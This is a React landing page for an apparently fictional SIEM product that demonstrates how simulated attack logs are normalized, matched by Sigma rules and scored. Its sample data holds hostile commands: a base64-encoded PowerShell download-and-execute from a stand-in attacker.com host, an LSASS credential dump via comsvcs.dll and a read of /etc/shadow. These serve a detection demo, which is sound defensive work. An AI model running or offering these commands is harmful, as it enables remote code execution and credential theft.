import React, { useState, useEffect } from 'react'
import { Link } from 'react-router-dom'
import { useAuth } from '../context/AuthContext'

// Comprehensive scenario log definitions representing realistic threat vectors
const SCENARIOS = {
  ssh_brute_force: {
    id: "ssh_brute_force",
    name: "SSH Brute-Force Spray",
    category: "Authentication Activity",
    rawLogs: [
      "<86>Oct 11 14:22:10 web-gateway-01 sshd[24101]: Failed password for invalid user admin from 192.168.1.152 port 50122 ssh2",
      "<86>Oct 11 14:22:11 web-gateway-01 sshd[24101]: Failed password for invalid user root from 192.168.1.152 port 50124 ssh2",
      "<86>Oct 11 14:22:12 web-gateway-01 sshd[24101]: Failed password for invalid user ubuntu from 192.168.1.152 port 50126 ssh2"
    ],
    ocsf: {
      category_uid: 3, // System Activity
      class_uid: 3002, // Authentication
      severity_id: 4,  // High
      device: { hostname: "web-gateway-01" },
      src_endpoint: { ip: "192.168.1.152", port: 50122 },
      actor: { user: { name: "admin" } },
      auth_protocol: "SSH",
      status_id: 2 // Failed
    },
    ioc_match: { matched: false, detail: "IP 192.168.1.152 is not in global Threat Intel feed (Internal subnet)." },
    rule_eval: { matched: true, name: "SSH Multi-Account Brute Force", severity: "High" },
    ml_score: { score: 0.35, is_anomaly: false, reason: "Login failures fit deterministic threshold rules; low structural entropy." }
  },
  powershell_obfuscated: {
    id: "powershell_obfuscated",
    name: "Obfuscated PowerShell Execution",
    category: "Process Activity",
    rawLogs: [
      "CEF:0|ThreatAnalyser|CollectorAgent|1.0|PROC_01|PowerShell Execution|Medium|shost=fin-ws-04 filePath=powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA"
    ],
    ocsf: {
      category_uid: 1, // System Activity
      class_uid: 1007, // Process Activity
      severity_id: 5,  // Critical
      device: { hostname: "fin-ws-04" },
      process: { name: "powershell.exe", cmd_line: "powershell.exe -EncodedCommand SQBFAFgAKABOAGU..." }
    },
    ioc_match: { matched: true, detail: "Command payload string references active malicious domain: 'attacker.com'." },
    rule_eval: { matched: true, name: "Sigma: PowerShell Base64 Encoded Command", severity: "Critical" },
    ml_score: { score: 0.96, is_anomaly: true, reason: "Abnormal Shannon entropy (6.81 bits) with rare base64 payload distribution." }
  },
  credential_dumping: {
    id: "credential_dumping",
    name: "Credential Dumping (LSASS)",
    category: "Privilege Escalation",
    rawLogs: [
      "CEF:0|ThreatAnalyser|CollectorAgent|1.0|PROC_02|LSASS Dump|Critical|shost=domain-ctrl-01 filePath=rundll32.exe comsvcs.dll,MiniDump 624 lsass.dmp"
    ],
    ocsf: {
      category_uid: 1,
      class_uid: 1007,
      severity_id: 5, // Critical
      device: { hostname: "domain-ctrl-01" },
      process: { name: "rundll32.exe", cmd_line: "rundll32.exe comsvcs.dll,MiniDump 624 lsass.dmp" }
    },
    ioc_match: { matched: false, detail: "Process hash signature verified as legitimate system binary (rundll32.exe)." },
    rule_eval: { matched: true, name: "LSASS Memory Dump Execution via comsvcs.dll", severity: "Critical" },
    ml_score: { score: 0.91, is_anomaly: true, reason: "Severe behavioral deviation: system binary targeting Local Security Authority memory." }
  },
  c2_network_beaconing: {
    id: "c2_network_beaconing",
    name: "C2 High-Port Network Beacon",
    category: "Network Activity",
    rawLogs: [
      '{"timestamp": "2026-09-01T03:00:15Z", "src_ip": "10.0.1.45", "src_port": 54122, "dest_ip": "185.220.101.5", "dest_port": 4444, "protocol": "TCP"}'
    ],
    ocsf: {
      category_uid: 4, // Network Activity
      class_uid: 4001, // Network Activity
      severity_id: 4,  // High
      device: { hostname: "prod-node-02" },
      src_endpoint: { ip: "10.0.1.45", port: 54122 },
      dest_endpoint: { ip: "185.220.101.5", port: 4444 },
      network_activity: { protocol: "TCP", dest_port: 4444 }
    },
    ioc_match: { matched: true, detail: "Destination IP 185.220.101.5 matched Threat Intel Index (Known Cobalt Strike C2 Server)." },
    rule_eval: { matched: true, name: "Sigma: Suspicious C2 High-Port Network Activity", severity: "High" },
    ml_score: { score: 0.88, is_anomaly: true, reason: "Uncommon outbound high-port 4444 egress outside organizational baseline." }
  },
  sudo_privilege_escalation: {
    id: "sudo_privilege_escalation",
    name: "Sudo Root Privilege Abuse",
    category: "User Access Activity",
    rawLogs: [
      "<85>Sep 01 03:01:22 srv-db sudo[14201]: intruder : 3 incorrect password attempts ; TTY=pts/2 ; USER=root ; COMMAND=/bin/cat /etc/shadow"
    ],
    ocsf: {
      category_uid: 3,
      class_uid: 3001, // User Access
      severity_id: 4,
      device: { hostname: "srv-db" },
      actor: { user: { name: "intruder" } },
      user: { name: "root" },
      process: { name: "sudo", cmd_line: "/bin/cat /etc/shadow" }
    },
    ioc_match: { matched: false, detail: "Host internal actor credential violation." },
    rule_eval: { matched: true, name: "Unauthorized /etc/shadow Access Attempt", severity: "High" },
    ml_score: { score: 0.82, is_anomaly: true, reason: "High-risk command string targeting system shadow authentication hashes." }
  }
}

const GLOBAL_IOC_FEED = [
  "185.220.101.5 (Cobalt Strike C2)",
  "SHA256: 44d88612fea8a8f36de82e1278abb02f",
  "evil-c2-listener.onion (Tor Hidden Service)",
  "45.155.205.233 (Mirai Scanner)",
  "powershell.exe -EncodedCommand SQBFAFgAK...",
  "103.152.220.11 (Active Brute Force Pool)",
  "SHA256: e3b0c44298fc1c149afbf4c8996fb924",
  "domain-sinkhole.threat-intel.org",
]

// Interactive Detection Core Presets
const OCSF_PRESETS = [
  {
    title: "Syslog Authentication (Class 3002)",
    raw: "<86>Oct 11 14:22:10 web sshd[24101]: Failed password for invalid user admin from 192.168.1.152 port 50122 ssh2",
    ocsf: {
      category_uid: 3,
      category_name: "Identity & Access",
      class_uid: 3002,
      class_name: "Authentication",
      severity_id: 4,
      activity_id: 2,
      activity_name: "Logon Failed",
      actor: { user: { name: "admin" } },
      src_endpoint: { ip: "192.168.1.152", port: 50122 },
      auth_protocol: "SSH",
      status: "Failure",
      metadata: { version: "1.1.0", product: "Threat Analyser OCSF Normalizer" }
    }
  },
  {
    title: "CEF Process Activity (Class 1007)",
    raw: "CEF:0|ThreatAnalyser|CollectorAgent|1.0|PROC_01|PowerShell Execution|High|shost=fin-ws-04 filePath=powershell.exe -EncodedCommand SQBFAFgAK...",
    ocsf: {
      category_uid: 1,
      category_name: "System Activity",
      class_uid: 1007,
      class_name: "Process Activity",
      severity_id: 5,
      activity_id: 1,
      activity_name: "Process Launch",
      device: { hostname: "fin-ws-04" },
      process: { name: "powershell.exe", cmd_line: "powershell.exe -EncodedCommand SQBFAFgAK..." },
      metadata: { version: "1.1.0", product: "Threat Analyser OCSF Normalizer" }
    }
  },
  {
    title: "JSON Network Activity (Class 4001)",
    raw: '{"timestamp": "2026-09-01T03:00:15Z", "src_ip": "10.0.1.45", "src_port": 54122, "dest_ip": "185.220.101.5", "dest_port": 4444, "protocol": "TCP"}',
    ocsf: {
      category_uid: 4,
      category_name: "Network Activity",
      class_uid: 4001,
      class_name: "Network Connection",
      severity_id: 4,
      activity_id: 1,
      src_endpoint: { ip: "10.0.1.45", port: 54122 },
      dest_endpoint: { ip: "185.220.101.5", port: 4444 },
      network_activity: { protocol: "TCP", dest_port: 4444 },
      metadata: { version: "1.1.0", product: "Threat Analyser OCSF Normalizer" }
    }
  }
]

const SIGMA_RULES_PRESETS = [
  {
    title: "PowerShell Base64 Obfuscated Execution",
    yaml: `title: Suspicious PowerShell Base64 Encoded Command
id: sigma-ps-enc-001
status: experimental
description: Detects encoded PowerShell command execution frequently seen in initial access
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\\powershell.exe'
    CommandLine|contains:
      - '-EncodedCommand'
      - '-enc'
      - '-e '
  condition: selection
falsepositives:
  - Administrative deployment scripts
level: critical`,
    targetLog: "powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8...",
    verdict: "MATCH DETECTED -> Severity: CRITICAL"
  },
  {
    title: "C2 High-Port Network Beaconing",
    yaml: `title: Suspicious C2 High-Port Network Activity
id: sigma-c2-port-002
status: production
description: Detects outbound TCP connections to uncommon high ports (4444, 9001, 1337)
logsource:
  category: network_connection
detection:
  selection:
    dest_port:
      - 4444
      - 9001
      - 1337
      - 31337
  condition: selection
level: high`,
    targetLog: '{"dest_ip": "185.220.101.5", "dest_port": 4444, "protocol": "TCP"}',
    verdict: "MATCH DETECTED -> Severity: HIGH"
  }
]

// Helper function to calculate Shannon Entropy in Javascript
function calculateEntropy(str) {
  if (!str) return 0
  const len = str.length
  const freqs = {}
  for (let i = 0; i < len; i++) {
    const c = str[i]
    freqs[c] = (freqs[c] || 0) + 1
  }
  let entropy = 0
  for (const c in freqs) {
    const p = freqs[c] / len
    entropy -= p * Math.log2(p)
  }
  return Number(entropy.toFixed(2))
}

export default function LandingPage() {
  const { user } = useAuth()

  // Terminal Boot State
  const [bootSequence, setBootSequence] = useState(() => {
    return sessionStorage.getItem('ta_boot_done') ? 'DONE' : 'BOOTING'
  })
  const [bootLines, setBootLines] = useState([])
  const [showDeployModal, setShowDeployModal] = useState(false)

  // Arena Simulation State
  const [selectedKey, setSelectedKey] = useState("powershell_obfuscated")
  const [activeStep, setActiveStep] = useState(0)
  const [isPlaying, setIsPlaying] = useState(false)
  const [systemMetrics, setSystemMetrics] = useState({
    eps: 12450,
    latency: 42,
    queue: 0,
  })

  // Detection Core Interactive Studio State
  const [activeCoreTab, setActiveCoreTab] = useState("ocsf") // 'ocsf' | 'sigma' | 'ml' | 'ioc' | 'kms'
  const [selectedOcsfPreset, setSelectedOcsfPreset] = useState(0)
  const [selectedSigmaPreset, setSelectedSigmaPreset] = useState(0)
  const [mlTestString, setMlTestString] = useState("powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0 ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA")
  const [iocSearchInput, setIocSearchInput] = useState("185.220.101.5")
  const [iocLookupResult, setIocLookupResult] = useState(null)
  const [kmsPayload, setKmsPayload] = useState('{"event": "SSH_AUTH_FAIL", "user": "root", "src_ip": "185.220.101.5"}')
  const [kmsTargetOrg, setKmsTargetOrg] = useState("tenant-alpha")
  const [kmsDecryptAttemptOrg, setKmsDecryptAttemptOrg] = useState("tenant-alpha")
  const [kmsTamperBlockIndex, setKmsTamperBlockIndex] = useState(null)


  const scenario = SCENARIOS[selectedKey] || SCENARIOS.powershell_obfuscated

  // Terminal Boot Sequence Animation
  useEffect(() => {
    if (bootSequence === 'DONE') return

    const steps = [
      { text: "[ 0.00s ] Initializing Threat Analyser Secure Ingress Node...", delay: 200 },
      { text: "[ 0.40s ] Decrypting tenant isolation key rings (RSA-4096 / TLS 1.3)...", delay: 600 },
      { text: "[ 0.80s ] Loading OCSF v1.1.0 semantic normalization engine...", delay: 1000 },
      { text: "[ 1.15s ] Launching unsupervised ML Isolation Forest & entropy models...", delay: 1400 },
      { text: "[ 1.50s ] Seeding Sigma heuristic compilers (5/5 detection rules active)...", delay: 1800 },
      { text: "[ 1.80s ] ✔ CONNECTED TO SAAS TENANT MULTI-TENANT CONTROL PLANE.", delay: 2200 },
    ]

    const timers = steps.map((s, idx) =>
      setTimeout(() => {
        setBootLines((prev) => [...prev, s.text])
        if (idx === steps.length - 1) {
          setTimeout(() => {
            setBootSequence('DONE')
            sessionStorage.setItem('ta_boot_done', 'true')
          }, 600)
        }
      }, s.delay)
    )

    return () => timers.forEach(clearTimeout)
  }, [bootSequence])

  const skipBoot = () => {
    setBootSequence('DONE')
    sessionStorage.setItem('ta_boot_done', 'true')
  }

  // Interactive Arena Step Animator
  useEffect(() => {
    let timer
    if (isPlaying) {
      timer = setInterval(() => {
        setActiveStep((prev) => {
          if (prev >= 5) {
            setIsPlaying(false)
            // Decay metrics back to normal
            setSystemMetrics({ eps: 12450, latency: 42, queue: 0 })
            return 5
          }
          return prev + 1
        })
      }, 1200)
    }
    return () => clearInterval(timer)
  }, [isPlaying])

  const runSimulation = (key) => {
    setSelectedKey(key)
    setActiveStep(0)
    setIsPlaying(true)
    // Instantaneous spike on ingest
    setSystemMetrics({
      eps: Math.floor(Math.random() * (16500 - 13000) + 13000),
      latency: Math.floor(Math.random() * (85 - 40) + 40),
      queue: Math.floor(Math.random() * 4 + 1),
    })
  }

  const handleIocSearch = (query) => {
    const q = (query || iocSearchInput).trim().toLowerCase()
    if (!q) return
    const knownMalicious = [
      { key: "185.220.101.5", type: "IP", severity: "CRITICAL", desc: "Cobalt Strike Command & Control (C2) Server" },
      { key: "45.155.205.233", type: "IP", severity: "HIGH", desc: "Mirai Botnet Ingress Scanner" },
      { key: "attacker.com", type: "Domain", severity: "CRITICAL", desc: "Malicious Payload Delivery Domain" },
      { key: "103.152.220.11", type: "IP", severity: "HIGH", desc: "Distributed SSH Brute Force Ingress" },
    ]
    const match = knownMalicious.find((m) => m.key.toLowerCase() === q)
    if (match) {
      setIocLookupResult({ matched: true, ...match })
    } else {
      setIocLookupResult({
        matched: false,
        key: q,
        type: "Indicator",
        severity: "CLEAN",
        desc: "No active threat intelligence matches. Indicator is within baseline trust limits."
      })
    }
  }

  // Calculate ML Entropy for input string
  const currentEntropy = calculateEntropy(mlTestString)
  const isHighEntropy = currentEntropy > 4.6
  const calculatedMlScore = Math.min(0.99, Math.max(0.12, (currentEntropy / 7.0) * 0.95 + (mlTestString.length > 80 ? 0.15 : 0)))

  // If still showing terminal boot
  if (bootSequence !== 'DONE') {
    return (
      <div className="bg-[#090d16] min-h-screen text-slate-100 font-mono flex flex-col justify-between p-6 select-none cyber-grid">
        <div className="flex justify-between items-center max-w-4xl mx-auto w-full">
          <div className="flex items-center gap-2 text-accent">
            <span className="animate-spin text-lg">◈</span>
            <span className="text-xs font-bold tracking-widest uppercase">Threat Analyser System Boot</span>
          </div>
          <button
            onClick={skipBoot}
            className="text-xs bg-base-800 hover:bg-base-700 text-slate-300 px-3 py-1.5 rounded border border-base-600 transition-colors"
          >
            Skip Boot Sequence [ESC]
          </button>
        </div>

        <div className="max-w-4xl mx-auto w-full bg-base-900/90 border border-base-700 rounded-lg p-6 shadow-2xl space-y-2">
          <div className="text-xs text-slate-500 pb-2 border-b border-base-800 flex justify-between">
            <span>KERNEL: Linux x86_64 / Containerized Ingress</span>
            <span className="text-accent">STATUS: INITIALIZING</span>
          </div>
          <div className="space-y-1.5 text-xs text-slate-300 py-3 min-h-[160px]">
            {bootLines.map((line, idx) => (
              <div key={idx} className={line.includes('CONNECTED') ? 'text-accent font-bold' : ''}>
                {line}
              </div>
            ))}
            <div className="inline-block w-2.5 h-4 bg-accent animate-pulse align-middle ml-1"></div>
          </div>
        </div>

        <div className="text-center text-xs text-slate-600 max-w-4xl mx-auto w-full">
          Continuous Endpoint Telemetry • Real-Time Threat Isolation • Zero API Blocking
        </div>
      </div>
    )
  }

  return (
    <div className="bg-[#090d16] text-slate-100 min-h-screen selection:bg-accent/30 selection:text-accent font-sans scroll-smooth">
      {/* 1. TOP NAVIGATION */}
      <header className="sticky top-0 z-40 bg-[#090d16]/80 backdrop-blur-md border-b border-slate-800">
        <div className="max-w-7xl mx-auto px-6 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <span className="text-accent text-2xl font-mono font-bold">◆</span>
            <div>
              <span className="font-mono font-bold text-slate-100 tracking-wider text-base block">THREAT ANALYSER</span>
              <span className="text-[10px] text-accent font-mono tracking-widest uppercase block -mt-1">Enterprise SIEM v2</span>
            </div>
          </div>

          <nav className="hidden md:flex items-center gap-6 text-xs font-medium text-slate-400 font-mono">
            <a href="#simulator" className="hover:text-accent transition-colors">Simulator Arena</a>
            <a href="#detection-core" className="hover:text-accent transition-colors text-accent font-bold">Detection Core</a>
            <a href="#architecture" className="hover:text-accent transition-colors">Architecture</a>
            <a href="#deploy" className="hover:text-accent transition-colors">Quick Deployment</a>
          </nav>

          <div className="flex items-center gap-3">
            {user ? (
              <Link
                to="/dashboard"
                className="btn-primary text-xs px-4 py-2 flex items-center gap-1.5"
              >
                <span>Open SOC Console</span>
                <span className="font-mono">→</span>
              </Link>
            ) : (
              <>
                <Link to="/login" className="btn-secondary text-xs px-3.5 py-1.5 font-mono">
                  Sign In
                </Link>
                <Link to="/register" className="btn-primary text-xs px-3.5 py-1.5 font-mono">
                  Launch Sandbox
                </Link>
              </>
            )}
          </div>
        </div>
      </header>

      {/* 2. SUB-HERO LIVE TELEMETRY TICKER */}
      <div className="bg-base-950 border-b border-slate-800/80 overflow-hidden py-2 text-xs font-mono">
        <div className="flex items-center">
          <div className="shrink-0 bg-accent/20 text-accent font-bold px-3 py-0.5 text-[10px] tracking-wider uppercase border-r border-slate-800 z-10">
            LIVE IOC FEED
          </div>
          <div className="overflow-hidden whitespace-nowrap flex">
            <div className="animate-marquee flex gap-8 text-slate-400 text-[11px]">
              {GLOBAL_IOC_FEED.concat(GLOBAL_IOC_FEED).map((ioc, idx) => (
                <span key={idx} className="flex items-center gap-2">
                  <span className="w-1.5 h-1.5 rounded-full bg-rose-500 animate-ping"></span>
                  <span>{ioc}</span>
                  <span className="text-slate-600">|</span>
                </span>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* 3. HERO SECTION */}
      <section className="relative pt-16 pb-20 px-6 cyber-grid overflow-hidden">
        <div className="max-w-5xl mx-auto text-center space-y-6">
          <div className="inline-flex items-center gap-2 bg-base-900 border border-accent/30 px-3 py-1 rounded-full text-xs text-accent font-mono">
            <span className="w-2 h-2 rounded-full bg-accent animate-pulse"></span>
            <span>ENTERPRISE SIEM &amp; ASYNCHRONOUS ML DETECTION CORE</span>
          </div>

          <h1 className="text-4xl sm:text-6xl font-extrabold tracking-tight text-slate-100 leading-tight">
            Continuous Endpoint Telemetry. <br />
            <span className="bg-gradient-to-r from-accent via-teal-300 to-cyan-400 bg-clip-text text-transparent">
              Real-Time Threat Isolation.
            </span> <br />
            Zero API Blocking.
          </h1>

          <p className="text-base sm:text-lg text-slate-400 max-w-3xl mx-auto leading-relaxed">
            An enterprise-grade, multi-tenant security operations center (SOC) that processes incoming Syslog, CEF, and JSON events asynchronously through Celery and ML models to spot breaches before they escalate.
          </p>

          <div className="flex flex-wrap items-center justify-center gap-4 pt-4">
            <Link
              to="/register"
              className="btn-primary text-sm px-6 py-3 font-bold flex items-center gap-2 shadow-[0_0_25px_rgba(0,212,160,0.3)]"
            >
              <span>⚡ Launch Live Sandbox Instance</span>
            </Link>

            <button
              onClick={() => setShowDeployModal(true)}
              className="btn-secondary text-sm px-5 py-3 font-semibold flex items-center gap-2"
            >
              <span>🐳 Deploy Cluster (Docker Compose)</span>
            </button>

            <a
              href="#detection-core"
              className="text-xs font-mono text-slate-400 hover:text-accent flex items-center gap-1.5 px-3 py-2"
            >
              <span>Explore Detection Core ↓</span>
            </a>
          </div>

          {/* Quick Metrics Bar */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-3 max-w-4xl mx-auto pt-10 text-left">
            <div className="p-3.5 bg-base-900/80 border border-base-700/80 rounded-lg">
              <span className="text-[10px] font-mono uppercase text-slate-500 block">Ingestion Latency</span>
              <span className="text-lg font-bold text-accent font-mono">&lt; 45 ms</span>
            </div>
            <div className="p-3.5 bg-base-900/80 border border-base-700/80 rounded-lg">
              <span className="text-[10px] font-mono uppercase text-slate-500 block">Schema Standard</span>
              <span className="text-lg font-bold text-cyan-400 font-mono">OCSF v1.1.0</span>
            </div>
            <div className="p-3.5 bg-base-900/80 border border-base-700/80 rounded-lg">
              <span className="text-[10px] font-mono uppercase text-slate-500 block">Rule Heuristics</span>
              <span className="text-lg font-bold text-amber-300 font-mono">Sigma AST</span>
            </div>
            <div className="p-3.5 bg-base-900/80 border border-base-700/80 rounded-lg">
              <span className="text-[10px] font-mono uppercase text-slate-500 block">Compliance Audit</span>
              <span className="text-lg font-bold text-emerald-400 font-mono">SOC 2 / ISO</span>
            </div>
          </div>
        </div>
      </section>

      {/* 4. INTERACTIVE SIMULATION ARENA */}
      <section id="simulator" className="py-20 px-6 bg-[#070b12] border-t border-b border-slate-800">
        <div className="max-w-6xl mx-auto space-y-8">
          {/* Header Block */}
          <div className="text-center space-y-3">
            <div className="inline-block text-xs font-mono uppercase text-accent bg-accent/10 px-3 py-1 rounded border border-accent/20">
              Interactive Execution Engine
            </div>
            <h2 className="text-3xl md:text-5xl font-extrabold tracking-tight bg-gradient-to-r from-accent via-teal-200 to-cyan-300 bg-clip-text text-transparent">
              Security Simulation Arena
            </h2>
            <p className="text-slate-400 max-w-2xl mx-auto text-sm">
              Interact with our real-time processing engine and observe how raw log byte streams are normalized, matched, and scored by our machine learning pipelines.
            </p>
          </div>

          {/* Telemetry Status Center */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 bg-[#0f172a] border border-slate-800 rounded-lg p-4 font-mono text-xs">
            <div className="flex justify-between border-b md:border-b-0 md:border-r border-slate-800 pb-2 md:pb-0 md:pr-4">
              <span className="text-slate-500">Events Per Second (EPS):</span>
              <span className="text-accent font-bold">{systemMetrics.eps.toLocaleString()}</span>
            </div>
            <div className="flex justify-between border-b md:border-b-0 md:border-r border-slate-800 py-2 md:py-0 md:px-4">
              <span className="text-slate-500">Pipeline Latency:</span>
              <span className="text-teal-400 font-bold">{systemMetrics.latency}ms</span>
            </div>
            <div className="flex justify-between pt-2 md:pt-0 md:pl-4">
              <span className="text-slate-500">Queue Buffer:</span>
              <span className={`font-bold ${systemMetrics.queue > 0 ? 'text-amber-400 animate-pulse' : 'text-emerald-400'}`}>
                {systemMetrics.queue} pending (Zero Loss)
              </span>
            </div>
          </div>

          {/* Attack Vector Selectors */}
          <div className="grid grid-cols-2 md:grid-cols-5 gap-3">
            {Object.entries(SCENARIOS).map(([key, data]) => (
              <button
                key={key}
                onClick={() => runSimulation(key)}
                className={`p-3 rounded-lg border text-left transition-all duration-300 ${
                  selectedKey === key
                    ? 'bg-accent/15 border-accent shadow-[0_0_15px_rgba(0,212,160,0.2)]'
                    : 'bg-[#151f32] border-slate-800 hover:border-slate-700'
                }`}
              >
                <div className="text-[10px] text-slate-500 uppercase tracking-widest font-mono">Attack Vector</div>
                <div className="text-xs font-bold mt-1 text-slate-200 truncate">{data.name}</div>
              </button>
            ))}
          </div>

          {/* Live Visualizer Stage */}
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
            {/* Active Processing Steps (Left Column - 7 cols) */}
            <div className="lg:col-span-7 bg-[#0f172a] border border-slate-800 rounded-xl p-5 space-y-3">
              <div className="flex items-center justify-between pb-2 border-b border-slate-800 text-xs font-mono">
                <span className="text-slate-400 uppercase tracking-wider font-semibold">Real-Time Ingestion Pipeline Flow</span>
                <span className="text-accent">{isPlaying ? '● Processing Telemetry...' : '✔ Ready for Simulation'}</span>
              </div>

              <div className="space-y-3">
                {/* Step 1: Raw Ingest */}
                <div className={`p-3.5 rounded-lg border transition-all duration-300 ${activeStep >= 1 ? 'border-teal-500/40 bg-teal-950/15' : 'border-slate-800 bg-base-950/40'}`}>
                  <div className="flex justify-between items-center">
                    <span className="font-bold text-xs text-slate-200">1. Raw Telemetry Ingest (POST /api/ingest/push)</span>
                    {activeStep === 1 && isPlaying && <span className="text-[11px] text-teal-400 animate-pulse font-mono">Buffering...</span>}
                    {activeStep >= 1 && <span className="text-[11px] text-accent font-mono">✔ Buffered (Celery / Redis)</span>}
                  </div>
                  {activeStep >= 1 && (
                    <div className="mt-2 text-[11px] font-mono bg-black/50 p-2 rounded text-slate-300 overflow-x-auto whitespace-pre-wrap">
                      {scenario.rawLogs[0]}
                    </div>
                  )}
                </div>

                {/* Step 2: OCSF Normalize */}
                <div className={`p-3.5 rounded-lg border transition-all duration-300 ${activeStep >= 2 ? 'border-teal-500/40 bg-teal-950/15' : 'border-slate-800 bg-base-950/40'}`}>
                  <div className="flex justify-between items-center">
                    <span className="font-bold text-xs text-slate-200">2. OCSF Schema Normalization (v1.1.0)</span>
                    {activeStep === 2 && isPlaying && <span className="text-[11px] text-teal-400 animate-pulse font-mono">Standardizing...</span>}
                    {activeStep >= 2 && <span className="text-[11px] text-accent font-mono">✔ Standardized (Class UID: {scenario.ocsf.class_uid})</span>}
                  </div>
                  {activeStep >= 2 && (
                    <div className="mt-2 text-[11px] font-mono bg-black/50 p-2 rounded text-emerald-400 max-h-36 overflow-y-auto">
                      <pre>{JSON.stringify(scenario.ocsf, null, 2)}</pre>
                    </div>
                  )}
                </div>

                {/* Step 3: Threat Intel (IOC) */}
                <div className={`p-3.5 rounded-lg border transition-all duration-300 ${activeStep >= 3 ? 'border-teal-500/40 bg-teal-950/15' : 'border-slate-800 bg-base-950/40'}`}>
                  <div className="flex justify-between items-center">
                    <span className="font-bold text-xs text-slate-200">3. Threat Intelligence IOC Lookup</span>
                    {activeStep === 3 && isPlaying && <span className="text-[11px] text-teal-400 animate-pulse font-mono">Scanning Threat Feed...</span>}
                    {activeStep >= 3 && <span className="text-[11px] text-accent font-mono">✔ Checked</span>}
                  </div>
                  {activeStep >= 3 && (
                    <p className={`mt-1.5 text-xs font-mono ${scenario.ioc_match.matched ? 'text-rose-400 font-bold' : 'text-slate-400'}`}>
                      {scenario.ioc_match.detail}
                    </p>
                  )}
                </div>

                {/* Step 4: Complex Event Rules */}
                <div className={`p-3.5 rounded-lg border transition-all duration-300 ${activeStep >= 4 ? 'border-teal-500/40 bg-teal-950/15' : 'border-slate-800 bg-base-950/40'}`}>
                  <div className="flex justify-between items-center">
                    <span className="font-bold text-xs text-slate-200">4. Sigma Rules &amp; Lookback Threshold Engine</span>
                    {activeStep === 4 && isPlaying && <span className="text-[11px] text-teal-400 animate-pulse font-mono">Evaluating AST...</span>}
                    {activeStep >= 4 && <span className="text-[11px] text-accent font-mono">✔ Evaluated</span>}
                  </div>
                  {activeStep >= 4 && (
                    <div className="mt-1.5 text-xs">
                      <span className="text-slate-400">Triggered Heuristics:</span>{" "}
                      <span className="text-rose-400 font-mono font-bold">{scenario.rule_eval.name} ({scenario.rule_eval.severity})</span>
                    </div>
                  )}
                </div>

                {/* Step 5: ML Anomaly Detector */}
                <div className={`p-3.5 rounded-lg border transition-all duration-300 ${activeStep >= 5 ? 'border-teal-500/40 bg-teal-950/15' : 'border-slate-800 bg-base-950/40'}`}>
                  <div className="flex justify-between items-center">
                    <span className="font-bold text-xs text-slate-200">5. Unsupervised ML Anomaly Scorer (Isolation Forest)</span>
                    {activeStep === 5 && isPlaying && <span className="text-[11px] text-teal-400 animate-pulse font-mono">Scoring Entropy &amp; Outliers...</span>}
                    {activeStep >= 5 && <span className="text-[11px] text-accent font-mono">✔ Analysis Completed</span>}
                  </div>
                  {activeStep >= 5 && (
                    <div className="mt-2 space-y-1 text-xs font-mono">
                      <div className="flex justify-between">
                        <span className="text-slate-400">Anomaly Probability:</span>
                        <span className={`font-bold ${scenario.ml_score.is_anomaly ? 'text-rose-400' : 'text-slate-300'}`}>
                          {(scenario.ml_score.score * 100).toFixed(1)}%
                        </span>
                      </div>
                      <p className="text-slate-400 italic font-sans text-xs">"{scenario.ml_score.reason}"</p>
                    </div>
                  )}
                </div>
              </div>
            </div>

            {/* Result Alert Panel (Right Column - 5 cols) */}
            <div className="lg:col-span-5 bg-[#0f172a] border border-slate-800 rounded-xl p-5 h-full flex flex-col justify-between space-y-5">
              <div>
                <h3 className="font-mono text-xs uppercase text-slate-400 tracking-wider mb-3">Triage Console Output Mockup</h3>
                {activeStep < 5 ? (
                  <div className="border border-dashed border-slate-800 rounded-lg p-10 text-center text-slate-500 flex flex-col items-center justify-center space-y-2 min-h-[280px]">
                    <div className="text-3xl animate-bounce">⚡</div>
                    <div className="text-sm font-semibold text-slate-300">Awaiting Pipeline Verdict...</div>
                    <div className="text-xs max-w-xs">Run an attack vector above to observe live state transformations and triage generation.</div>
                  </div>
                ) : (
                  <div className={`border rounded-lg p-4 space-y-3 min-h-[280px] animate-fade-in ${
                    scenario.ocsf.severity_id >= 4 ? 'border-rose-500/40 bg-rose-950/15' : 'border-amber-500/40 bg-amber-950/15'
                  }`}>
                    <div className="flex justify-between items-start">
                      <div>
                        <span className={`text-[10px] uppercase font-bold px-2 py-0.5 rounded font-mono ${
                          scenario.ocsf.severity_id >= 4 ? 'bg-rose-500/20 text-rose-300 border border-rose-500/30' : 'bg-amber-500/20 text-amber-300 border border-amber-500/30'
                        }`}>
                          {scenario.ocsf.severity_id >= 4 ? 'CRITICAL INCIDENT' : 'HIGH INCIDENT'}
                        </span>
                        <h4 className="font-bold text-base text-slate-100 mt-2">{scenario.name}</h4>
                      </div>
                    </div>

                    <div className="space-y-1.5 text-xs border-t border-slate-800/60 pt-2 font-mono">
                      <div className="flex justify-between">
                        <span className="text-slate-500">Target Device:</span>
                        <span className="text-slate-300">{scenario.ocsf.device?.hostname || 'External Gateway'}</span>
                      </div>
                      {scenario.ocsf.actor?.user && (
                        <div className="flex justify-between">
                          <span className="text-slate-500">Origin Actor:</span>
                          <span className="text-slate-300">{scenario.ocsf.actor.user.name}</span>
                        </div>
                      )}
                      <div className="flex justify-between">
                        <span className="text-slate-500">ML Anomaly Flag:</span>
                        <span className={`font-bold ${scenario.ml_score.is_anomaly ? 'text-rose-400' : 'text-slate-400'}`}>
